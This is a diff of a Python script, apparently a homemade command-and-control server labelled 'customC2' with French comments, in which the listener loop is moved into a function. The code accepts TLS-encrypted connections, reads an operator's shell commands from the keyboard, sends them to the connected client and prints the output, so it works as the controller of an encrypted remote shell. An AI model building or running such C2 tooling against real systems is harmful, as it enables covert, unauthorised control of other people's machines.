@@ -27,34 +27,37 @@ context =  ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 context.load_cert_chain(certfile=CERTIFICATE, keyfile=KEY)
 
 #à mettre dans une fonction
-while sock:
-    print(f"[*] Listening to {HOST}:{PORT}...")
-    conn, addr = sock.accept()
+def shell(sock):
+    while sock:
+        print(f"[*] Listening to {HOST}:{PORT}...")
+        conn, addr = sock.accept()
 
-    # Envelopper la connexion entrante dans un contexte SSL
-    connssl = context.wrap_socket(conn, server_side=True)
-    print(f"[+] Session encrypted in {connssl.version()}")
+        # Envelopper la connexion entrante dans un contexte SSL
+        connssl = context.wrap_socket(conn, server_side=True)
+        print(f"[+] Session encrypted in {connssl.version()}")
 
-    try:
-        print(f"[+] Client connected : {addr}")
-        while True:
-            command = input("(customC2) $ ")
-            if command == ":exit":
-                print('quitting console')
-                sock.shutdown(socket.SHUT_RDWR)
-                conn.shutdown(socket.SHUT_RDWR)
-                sock.close()
-                conn.close()
-                exit(0)
-            connssl.sendall(command.encode())
-            reply = connssl.recv(BUFFER_SIZE)
-            if not reply:
-                break
-            print(reply.decode())
-    except Exception:
-        print(f"[-] Fatal error: killing session with {addr}")
-        exit(-1)
-    finally:
-        connssl.shutdown(socket.SHUT_RDWR)
-        connssl.close()
-        exit(0)
+        try:
+            print(f"[+] Client connected : {addr}")
+            while True:
+                command = input("(customC2) $ ")
+                if command == ":exit":
+                    print('quitting console')
+                    sock.shutdown(socket.SHUT_RDWR)
+                    conn.shutdown(socket.SHUT_RDWR)
+                    sock.close()
+                    conn.close()
+                    exit(0)
+                connssl.sendall(command.encode())
+                reply = connssl.recv(BUFFER_SIZE)
+                if not reply:
+                    break
+                print(reply.decode())
+        except Exception:
+            print(f"[-] Fatal error: killing session with {addr}")
+            exit(-1)
+        finally:
+            connssl.shutdown(socket.SHUT_RDWR)
+            connssl.close()
+            exit(0)
+
+shell(sock)
